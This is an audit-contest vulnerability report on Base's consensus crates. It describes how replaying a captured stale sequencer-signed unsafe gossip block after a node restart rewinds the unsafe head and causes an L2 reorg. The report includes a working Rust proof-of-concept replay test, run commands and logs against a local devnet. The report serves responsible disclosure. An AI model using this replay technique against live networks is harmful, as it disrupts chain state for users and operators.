# 74856 bc medium replay of stale sequencer signed unsafe gossip rewinds unsafe head and causes unintended l2 reorg behavior

**Submitted on Apr 25th 2026 at 11:15:08 UTC by @vivekd for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #74856
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.24>
* **Impacts:**
  * A bug in the respective layer 0/1/2 network code that results in unintended smart contract behavior with no concrete funds at direct risk

## Description

## Brief/Intro

Base-native consensus code accepts a replayed, previously valid sequencer-signed unsafe gossip payload and can overwrite the current unsafe\_head with that older block. If the target is the active sequencer and its gossip dedup state has been cleared, the next sequencing tick rebuilds from the stale ancestor and replaces the current unsafe branch. This causes unintended L2 contract behavior on latest / unsafe state, without demonstrated safe\_head, finalized\_head, bridge, or direct funds impact.

## Vulnerability Details

The vulnerable code is in the in-scope Base-native consensus crates, not in devnet. devnet is out of scope as an asset (Contest\_Rules.md:227), but it is used here only as a local harness to reproduce the issue in the in-scope consensus path.

The affected flow is:

```
gossip -> BlockHandler validation -> NetworkActor forwarding -> ProcessUnsafeL2Block -> InsertTask -> SynchronizeTask -> EngineSyncState::apply_update -> unsafe_head watch channel -> PayloadBuilder::build()
```

Inbound unsafe gossip is received by the network actor and forwarded to the engine with no monotonicity or parent-continuity check (scope/base/crates/consensus/service/src/actors/network/actor.rs:193, scope/base/crates/consensus/service/src/actors/network/actor.rs:198, scope/base/crates/consensus/service/src/actors/engine/engine\_request\_processor.rs:584). Gossip validation checks only the timestamp acceptance window, payload hash, version-specific validity, exact-hash dedup, and sequencer signature. It does not require the incoming block to be newer than the current unsafe\_head or to be its direct child (scope/base/crates/consensus/gossip/src/block\_validity.rs:167).

Once accepted, InsertTask always turns the payload into EngineSyncStateUpdate { unsafe\_head: Some(new\_unsafe\_ref), ... } and calls SynchronizeTask (scope/base/crates/consensus/engine/src/task\_queue/tasks/insert/task.rs:129). SynchronizeTask only rejects the update when unsafe\_head < finalized\_head; it does not enforce monotonicity or parent continuity (scope/base/crates/consensus/engine/src/task\_queue/tasks/synchronize/task.rs:118). EngineSyncState::apply\_update then blindly overwrites unsafe\_head (scope/base/crates/consensus/engine/src/state/core.rs:92).

This is not only a CL-local rewind. The successful PoC logs show the EL accepts the replayed stale block and then serves it as the current unsafe head for later sequencing. Base's own engine code documents the same EL behavior in the reset path: a stale forkchoice\_updated can return Valid and cause reth to set that stale block as canonical (scope/base/crates/consensus/service/src/actors/engine/engine\_request\_processor.rs:596).

This matters most on the active sequencer because PayloadBuilder::build() always reads the current unsafe\_head from the engine watch channel before starting the next block (scope/base/crates/consensus/service/src/actors/sequencer/build.rs:61). The sequencer's stale-build guard handles only:

* current\_head.number > build\_parent.number
* same-height / different-hash reorgs

It misses the backward-regression case current\_head.number < build\_parent.number (scope/base/crates/consensus/service/src/actors/sequencer/actor.rs:146). After replay, the in-flight build is dropped with UnsafeHeadChangedSinceBuild, and the next sequencing tick rebuilds from the stale ancestor.

The same unsafe-head regression also affects restarted non-sequencer followers: they use the same gossip-to-engine path, and rollup RPC exposes unsafe\_l2 directly from the engine sync state (scope/base/crates/consensus/rpc/src/rollup.rs:59, scope/base/crates/consensus/rpc/src/rollup.rs:69). So a restarted follower can also serve regressed latest / unsafe state to RPC consumers even if it is not sequencing.

### Real-World Preconditions

The attacker needs:

* a captured authentic sequencer-signed unsafe gossip envelope,
* replay before that envelope expires from the gossip timestamp acceptance window: not more than 60 seconds in the past and not more than 5 seconds in the future (scope/base/crates/consensus/gossip/src/block\_validity.rs:170),
* a target whose dedup state has been cleared, such as a restarted active sequencer or follower,
* and the old block must still be valid/importable by the EL.

The manual restart downgrade clause does not apply because the report relies on normal restart-induced dedup loss, not on an assumption that operators fail to restart (Contest\_Rules.md:250). The timing window is operationally reachable: in the successful PoC, restart, reconnect, and replay completed in roughly 7 seconds, well inside the acceptance window.

## Impact Details

The strongest supported impact is Medium unintended smart contract behavior. After replay, the current unsafe branch is replaced by a different branch rooted at an older ancestor. Any transaction or contract state change that existed only on the displaced unsafe branch disappears from latest / unsafe state until it is re-included. The PoC proves this branch-replacement primitive directly by showing:

* a restarted sequencer bootstraps at unsafe head 4,
* replayed stale block 2 becomes the new unsafe\_head,
* the in-flight build is dropped because the unsafe head changed underneath it,
* sequencing resumes from parent 2,
* and different 3/4/5 blocks are produced.

I am not claiming corruption of safe\_head or finalized\_head, bridge impact, direct funds loss, or a persistent network partition. Medium is therefore the correct ceiling.

## Proof of Concept

This PoC is a runnable patch against `base/base` tag `v0.8.0-rc.24`. It uses `devnet` only as a local harness. The vulnerable path being exercised is in the in-scope Base-native consensus crates:

```
gossip -> BlockHandler validation -> NetworkActor forwarding -> ProcessUnsafeL2Block -> InsertTask -> SynchronizeTask -> EngineSyncState::apply_update -> unsafe_head watch channel -> PayloadBuilder::build()
```

### Patch Setup

Add the two test-only dependencies needed by the harness:

```diff
diff --git a/devnet/Cargo.toml b/devnet/Cargo.toml
index 280b7387..6f7fe84a 100644
--- a/devnet/Cargo.toml
+++ b/devnet/Cargo.toml
@@ -89,3 +89,7 @@ alloy-consensus = { workspace = true, features = ["std"] }
 
 # base-alloy
 base-common-rpc-types.workspace = true
+base-common-rpc-types-engine = { workspace = true, features = ["std"] }
+
+# p2p
+discv5.workspace = true
```

After adding those dependencies, `Cargo.lock` should include `base-common-rpc-types-engine` and `discv5` in the `devnet` package dependency list. Running the test command below will update the lockfile if needed.

Create `devnet/tests/unsafe_gossip_replay.rs` with the following contents:

```rust
#![allow(missing_docs)]

use std::{
    net::{IpAddr, Ipv4Addr},
    time::Duration,
};

use alloy_genesis::ChainConfig;
use alloy_primitives::B256;
use alloy_provider::{Provider, RootProvider};
use alloy_rpc_types_engine::JwtSecret;
use base_common_network::Base;
use base_common_rpc_types_engine::NetworkPayloadEnvelope;
use base_consensus_disc::LocalNode;
use base_consensus_genesis::RollupConfig;
use base_consensus_gossip::{BlockHandler, P2pRpcRequest, default_config_builder};
use base_consensus_node::{GossipTransport, NetworkBuilder, NetworkHandler};
use base_consensus_rpc::{BaseP2PApiClient, RollupNodeApiClient};
use base_node_runner::test_utils::init_silenced_tracing;
use devnet::{
    config::{BUILDER, SEQUENCER},
    l1::{L1Stack, L1StackConfig},
    l2::{InProcessBuilder, InProcessBuilderConfig, InProcessConsensus, InProcessConsensusConfig},
    setup::{L1GenesisOutput, L2DeploymentOutput, SetupContainer},
};
use discv5::{ConfigBuilder as Discv5ConfigBuilder, ListenConfig};
use eyre::{Result, WrapErr, eyre};
use jsonrpsee::http_client::HttpClientBuilder;
use k256::ecdsa::SigningKey;
use libp2p::{Multiaddr, identity::Keypair};
use tempfile::TempDir;
use tokio::{
    sync::mpsc,
    time::{Instant, sleep, timeout},
};
use url::Url;

const L1_CHAIN_ID: u64 = 1337;
const L2_CHAIN_ID: u64 = 84538453;
const SLOT_DURATION: u64 = 2;
const STALE_BLOCK_NUMBER: u64 = 2;
const ORIGINAL_TIP_BEFORE_RESTART: u64 = 4;

#[derive(Debug)]
enum RawPeerCommand {
    Connect(Multiaddr),
    Publish(NetworkPayloadEnvelope),
}

#[derive(Debug)]
struct RawGossipPeer {
    cmd_tx: mpsc::Sender<RawPeerCommand>,
    payload_rx: mpsc::Receiver<NetworkPayloadEnvelope>,
    _task: tokio::task::JoinHandle<Result<()>>,
}

impl RawGossipPeer {
    async fn start(rollup_config: RollupConfig) -> Result<Self> {
        let mut handler = build_raw_handler(rollup_config).await?;
        let (cmd_tx, mut cmd_rx) = mpsc::channel(8);
        let (payload_tx, payload_rx) = mpsc::channel(32);

        let task = tokio::spawn(async move {
            loop {
                tokio::select! {
                    maybe_cmd = cmd_rx.recv() => {
                        let Some(cmd) = maybe_cmd else {
                            return Ok(());
                        };
                        match cmd {
                            RawPeerCommand::Connect(address) => {
                                handler.handle_p2p_rpc(P2pRpcRequest::ConnectPeer { address });
                            }
                            RawPeerCommand::Publish(envelope) => {
                                let timestamp = envelope.payload.timestamp();
                                let selector = |handler: &BlockHandler| handler.topic(timestamp);
                                handler
                                    .gossip
                                    .publish(selector, Some(envelope))
                                    .map_err(|e| eyre!("failed to publish captured envelope: {e}"))?;
                            }
                        }
                    }
                    event = handler.gossip.next() => {
                        let Some(event) = event else {
                            return Ok(());
                        };
                        if let Some(payload) = handler.gossip.handle_event(event)
                            && payload_tx.send(payload).await.is_err()
                        {
                            return Ok(());
                        }
                    }
                }
            }
        });

        Ok(Self { cmd_tx, payload_rx, _task: task })
    }

    async fn connect(&self, multiaddr: &str) -> Result<()> {
        self.cmd_tx
            .send(RawPeerCommand::Connect(
                multiaddr.parse().wrap_err("invalid peer multiaddr")?,
            ))
            .await
            .map_err(|_| eyre!("raw peer command channel closed"))
    }

    async fn publish(&self, envelope: NetworkPayloadEnvelope) -> Result<()> {
        self.cmd_tx
            .send(RawPeerCommand::Publish(envelope))
            .await
            .map_err(|_| eyre!("raw peer command channel closed"))
    }

    async fn recv_block(
        &mut self,
        number: u64,
        timeout_duration: Duration,
    ) -> Result<NetworkPayloadEnvelope> {
        let deadline = Instant::now() + timeout_duration;
        loop {
            let remaining = deadline
                .checked_duration_since(Instant::now())
                .ok_or_else(|| eyre!("timed out waiting for captured block {number}"))?;

            let envelope = timeout(remaining, self.payload_rx.recv())
                .await
                .wrap_err("timed out waiting for captured gossip payload")?
                .ok_or_else(|| eyre!("raw peer payload channel closed"))?;

            if envelope.payload.block_number() == number {
                return Ok(envelope);
            }
        }
    }
}

struct SequencerReplayStack {
    _temp_dir: TempDir,
    _l1_genesis: L1GenesisOutput,
    _l2_deployment: L2DeploymentOutput,
    _l1_stack: L1Stack,
    builder: InProcessBuilder,
    jwt_secret: JwtSecret,
    rollup_config: RollupConfig,
    l1_chain_config: ChainConfig,
    l1_rpc_url: Url,
    l1_beacon_url: Url,
}

impl SequencerReplayStack {
    async fn new() -> Result<Self> {
        let temp_dir = TempDir::new().wrap_err("failed to create temp directory")?;
        let setup = SetupContainer::new(temp_dir.path())
            .with_chain_id(L1_CHAIN_ID)
            .with_l2_chain_id(L2_CHAIN_ID)
            .with_slot_duration(SLOT_DURATION);

        let l1_genesis = tokio::task::spawn_blocking({
            let setup = setup.clone();
            move || setup.generate_l1_genesis()
        })
        .await
        .wrap_err("L1 genesis task panicked")?
        .wrap_err("failed to generate L1 genesis")?;

        let l1_stack = L1Stack::start(L1StackConfig {
            el_genesis_json: l1_genesis.read_el_genesis()?,
            jwt_secret_hex: l1_genesis.read_jwt_secret()?,
            testnet_dir: l1_genesis.testnet_dir(),
            container_config: None,
        })
        .await
        .wrap_err("failed to start L1 stack")?;

        let l1_internal_rpc_url = l1_stack.reth().internal_rpc_url();
        let l2_deployment =
            tokio::task::spawn_blocking(move || setup.deploy_l2_contracts(&l1_internal_rpc_url))
                .await
                .wrap_err("L2 deployment task panicked")?
                .wrap_err("failed to deploy L2 contracts")?;

        let jwt_secret = JwtSecret::random();
        let l2_genesis = std::fs::read(l2_deployment.genesis_path())
            .wrap_err("failed to read L2 genesis")?;
        let rollup_config_bytes = std::fs::read(l2_deployment.rollup_config_path())
            .wrap_err("failed to read rollup config")?;
        let l1_genesis_bytes = std::fs::read(l1_genesis.el_genesis_path())
            .wrap_err("failed to read L1 genesis bytes")?;

        let builder = InProcessBuilder::start(InProcessBuilderConfig {
            genesis_json: l2_genesis,
            jwt_secret: jwt_secret.clone(),
            http_port: None,
            ws_port: None,
            auth_port: None,
            p2p_port: None,
            flashblocks_port: None,
        })
        .await
        .wrap_err("failed to start in-process builder")?;

        let rollup_config: RollupConfig =
            serde_json::from_slice(&rollup_config_bytes).wrap_err("invalid rollup config")?;
        let l1_chain_config: ChainConfig =
            serde_json::from_slice(&l1_genesis_bytes).wrap_err("invalid L1 chain config")?;
        let l1_rpc_url = l1_stack.rpc_url().await?;
        let l1_beacon_url: Url = l1_stack
            .beacon_url()
            .await?
            .parse()
            .wrap_err("invalid L1 beacon URL")?;

        Ok(Self {
            _temp_dir: temp_dir,
            _l1_genesis: l1_genesis,
            _l2_deployment: l2_deployment,
            _l1_stack: l1_stack,
            builder,
            jwt_secret,
            rollup_config,
            l1_chain_config,
            l1_rpc_url,
            l1_beacon_url,
        })
    }

    async fn start_sequencer_consensus(&self) -> Result<InProcessConsensus> {
        InProcessConsensus::start(InProcessConsensusConfig {
            rollup_config: self.rollup_config.clone(),
            l1_chain_config: self.l1_chain_config.clone(),
            jwt_secret: self.jwt_secret.clone(),
            l1_rpc_url: self.l1_rpc_url.clone(),
            l1_beacon_url: self.l1_beacon_url.clone(),
            l2_engine_url: self.builder.engine_url()?,
            mode: base_consensus_node::NodeMode::Sequencer,
            sequencer_key: Some(SEQUENCER.private_key),
            p2p_key: Some(BUILDER.private_key),
            rpc_port: None,
            p2p_tcp_port: None,
            p2p_udp_port: None,
            unsafe_block_signer: SEQUENCER.address,
            l1_slot_duration_override: Some(4),
            sequencer_stopped: true,
            verifier_l1_confs: 0,
        })
        .await
    }

    fn builder_provider(&self) -> Result<RootProvider<Base>> {
        Ok(RootProvider::new_http(self.builder.rpc_url()?))
    }
}

#[tokio::test(flavor = "multi_thread")]
async fn restarted_sequencer_accepts_replayed_stale_unsafe_gossip() -> Result<()> {
    init_silenced_tracing();

    let stack = SequencerReplayStack::new().await?;
    let builder_provider = stack.builder_provider()?;

    let sequencer = stack.start_sequencer_consensus().await?;
    let mut sniffer = RawGossipPeer::start(stack.rollup_config.clone()).await?;
    sniffer.connect(&sequencer.p2p_addr()).await?;
    wait_for_connected_gossip_peer(sequencer.rpc_url(), 1, Duration::from_secs(20)).await?;

    sequencer.start_sequencer().await?;

    let captured_stale = sniffer.recv_block(STALE_BLOCK_NUMBER, Duration::from_secs(30)).await?;
    wait_for_block_number(&builder_provider, ORIGINAL_TIP_BEFORE_RESTART, Duration::from_secs(45))
        .await?;

    let pre_replay = current_sync_status(sequencer.rpc_url()).await?;
    assert!(
        pre_replay.unsafe_l2.block_info.number >= ORIGINAL_TIP_BEFORE_RESTART,
        "sequencer must advance past the stale block before replay"
    );

    let child_number = STALE_BLOCK_NUMBER + 1;
    let original_child_hash =
        wait_for_block_hash(&builder_provider, child_number, Duration::from_secs(10)).await?;

    drop(sniffer);
    drop(sequencer);
    sleep(Duration::from_secs(1)).await;

    let restarted = stack.start_sequencer_consensus().await?;
    let replayer = RawGossipPeer::start(stack.rollup_config.clone()).await?;
    replayer.connect(&restarted.p2p_addr()).await?;
    wait_for_connected_gossip_peer(restarted.rpc_url(), 1, Duration::from_secs(20)).await?;

    restarted.start_sequencer().await?;
    let bootstrapped = wait_for_unsafe_head_at_least(
        restarted.rpc_url(),
        pre_replay.unsafe_l2.block_info.number,
        Duration::from_secs(15),
    )
    .await?;
    assert_eq!(
        bootstrapped.unsafe_l2.block_info.hash,
        pre_replay.unsafe_l2.block_info.hash,
        "restarted sequencer should initially bootstrap from the existing EL unsafe head"
    );

    replayer.publish(captured_stale.clone()).await?;

    let regressed =
        wait_for_unsafe_head_number(restarted.rpc_url(), STALE_BLOCK_NUMBER, Duration::from_secs(8))
            .await?;
    assert_eq!(
        regressed.unsafe_l2.block_info.hash,
        captured_stale.payload.block_hash(),
        "replayed gossip should rewind the sequencer to the stale block"
    );

    let rebuilt_child_hash = wait_for_block_hash_change(
        &builder_provider,
        child_number,
        original_child_hash,
        Duration::from_secs(20),
    )
    .await?;
    assert_ne!(
        rebuilt_child_hash, original_child_hash,
        "sequencer should rebuild a different child on top of the stale ancestor after replay"
    );

    Ok(())
}

async fn build_raw_handler(rollup_config: RollupConfig) -> Result<NetworkHandler> {
    let keypair = Keypair::generate_secp256k1();
    let secp_key = keypair
        .clone()
        .try_into_secp256k1()
        .map_err(|e| eyre!("failed to convert keypair to secp256k1: {e}"))?
        .secret()
        .to_bytes();
    let signing_key = SigningKey::from_bytes((&secp_key).into())
        .map_err(|e| eyre!("failed to derive signing key from libp2p keypair: {e}"))?;

    let listen_ip = IpAddr::V4(Ipv4Addr::LOCALHOST);
    let discovery_config = Discv5ConfigBuilder::new(ListenConfig::from_ip(listen_ip, 0))
        .table_filter(|enr| enr.ip4().is_some_and(|ip| ip.is_loopback()))
        .build();

    let gossip_address: Multiaddr = format!("/ip4/{listen_ip}/tcp/0")
        .parse()
        .wrap_err("failed to build raw peer gossip address")?;

    NetworkBuilder::new(
        rollup_config,
        SEQUENCER.address,
        gossip_address,
        keypair,
        LocalNode::new(signing_key, listen_ip, 0, 0),
        discovery_config,
        None,
    )
    .with_gossip_config(
        default_config_builder()
            .flood_publish(true)
            .build()
            .expect("valid raw peer gossip config"),
    )
    .build()
    .wrap_err("failed to build raw network driver")?
    .start()
    .await
    .wrap_err("failed to start raw network handler")
}

async fn current_sync_status(rpc_url: Url) -> Result<base_protocol::SyncStatus> {
    let client = HttpClientBuilder::default()
        .build(rpc_url.as_str())
        .wrap_err("failed to build rollup RPC client")?;
    client.sync_status().await.wrap_err("failed to query sync status")
}

async fn wait_for_connected_gossip_peer(
    rpc_url: Url,
    minimum_peers: usize,
    timeout_duration: Duration,
) -> Result<()> {
    let client = HttpClientBuilder::default()
        .build(rpc_url.as_str())
        .wrap_err("failed to build P2P RPC client")?;

    timeout(timeout_duration, async {
        loop {
            let count = client.opp2p_peer_count().await?;
            if count.connected_gossip >= minimum_peers {
                return Ok::<(), eyre::Report>(());
            }
            sleep(Duration::from_millis(100)).await;
        }
    })
    .await
    .wrap_err("timed out waiting for connected gossip peer")?
}

async fn wait_for_unsafe_head_at_least(
    rpc_url: Url,
    minimum_number: u64,
    timeout_duration: Duration,
) -> Result<base_protocol::SyncStatus> {
    timeout(timeout_duration, async {
        loop {
            let status = current_sync_status(rpc_url.clone()).await?;
            if status.unsafe_l2.block_info.number >= minimum_number {
                return Ok::<_, eyre::Report>(status);
            }
            sleep(Duration::from_millis(100)).await;
        }
    })
    .await
    .wrap_err("timed out waiting for unsafe head to reach expected height")?
}

async fn wait_for_unsafe_head_number(
    rpc_url: Url,
    number: u64,
    timeout_duration: Duration,
) -> Result<base_protocol::SyncStatus> {
    timeout(timeout_duration, async {
        loop {
            let status = current_sync_status(rpc_url.clone()).await?;
            if status.unsafe_l2.block_info.number == number {
                return Ok::<_, eyre::Report>(status);
            }
            sleep(Duration::from_millis(50)).await;
        }
    })
    .await
    .wrap_err("timed out waiting for exact unsafe head regression")?
}

async fn wait_for_block_number(
    provider: &RootProvider<Base>,
    minimum_number: u64,
    timeout_duration: Duration,
) -> Result<u64> {
    timeout(timeout_duration, async {
        loop {
            let current = provider.get_block_number().await?;
            if current >= minimum_number {
                return Ok::<_, eyre::Report>(current);
            }
            sleep(Duration::from_millis(250)).await;
        }
    })
    .await
    .wrap_err("timed out waiting for builder block production")?
}

async fn wait_for_block_hash(
    provider: &RootProvider<Base>,
    number: u64,
    timeout_duration: Duration,
) -> Result<B256> {
    timeout(timeout_duration, async {
        loop {
            if let Some(block) = provider.get_block_by_number(number.into()).await? {
                return Ok::<_, eyre::Report>(block.header.hash);
            }
            sleep(Duration::from_millis(200)).await;
        }
    })
    .await
    .wrap_err("timed out waiting for target block hash")?
}

async fn wait_for_block_hash_change(
    provider: &RootProvider<Base>,
    number: u64,
    original_hash: B256,
    timeout_duration: Duration,
) -> Result<B256> {
    timeout(timeout_duration, async {
        loop {
            if let Some(block) = provider.get_block_by_number(number.into()).await?
                && block.header.hash != original_hash
            {
                return Ok::<_, eyre::Report>(block.header.hash);
            }
            sleep(Duration::from_millis(200)).await;
        }
    })
    .await
    .wrap_err("timed out waiting for rebuilt block hash to replace the original child")?
}
```

### What This Code Does

* Uses `devnet` only as a local runner; the bug itself is in the in-scope consensus crates.
* Captures a real sequencer-signed unsafe gossip envelope for stale block 2.
* Waits until the sequencer advances to block 4.
* Restarts the sequencer to clear gossip dedup state.
* Replays the exact captured envelope over real libp2p gossip.
* Asserts that the restarted sequencer's `unsafe_head` regresses to block 2.
* Asserts that block 3 is rebuilt with a different hash, proving unsafe branch replacement.

### How to Run

```bash
cd crates/utilities/test-utils/contracts
forge soldeer install
forge build

cd ../../../../
cargo test -p devnet --test unsafe_gossip_replay -- --nocapture
```

{% hint style="warning" %}
If macOS fails because `.cargo/config.toml` points to a missing `ld64.lld`, temporarily move that file aside before running the test:
{% endhint %}

```bash
mv .cargo/config.toml .cargo/config.toml.disabled
cargo test -p devnet --test unsafe_gossip_replay -- --nocapture
mv .cargo/config.toml.disabled .cargo/config.toml
```

### Logs

<details>

<summary>Logs</summary>

The test passes and the logs show the restarted sequencer initially building from unsafe head 4, accepting replayed stale block 2, dropping the in-flight block because the unsafe head changed, and then rebuilding a new branch from parent 2:

```
INFO devnet::l2::in_process_consensus: sequencer started via admin RPC unsafe_head=0x8cef95054690e231c1dea3724e164a90a8a143fb63ac28919e3acb9098013328
INFO sequencer: Started sequencing new block parent_num=4 l1_origin_num=31

INFO reth_node_events::node: Received new payload from consensus engine number=2 hash=0x613d1c8c2c463f23a1cad9554e61f83bd797766c09fe1d1de858d6f8111095f8
INFO engine: Inserted new unsafe block hash=0x613d1c8c2c463f23a1cad9554e61f83bd797766c09fe1d1de858d6f8111095f8 number=2

ERROR engine: GetPayload attributes parent does not match unsafe head, returning rebuild error ... unsafe_block_info=... number: 2 ... parent_block_info=... number: 4 ...
INFO sequencer: Get payload failed. err=UnsafeHeadChangedSinceBuild
WARN sequencer: Non-fatal seal error, dropping block error=UnsafeHeadChangedSinceBuild

INFO sequencer: Started sequencing new block parent_num=2 l1_origin_num=30
INFO reth_node_events::node: Received new payload from consensus engine number=3 hash=0x0aec90f8e03b4a40456549ad2be66c497edee371a52095c86de4a12be06b864d
INFO engine: Inserted new unsafe block hash=0x0aec90f8e03b4a40456549ad2be66c497edee371a52095c86de4a12be06b864d number=3

test restarted_sequencer_accepts_replayed_stale_unsafe_gossip ... ok
test result: ok. 1 passed; 0 failed
```

</details>
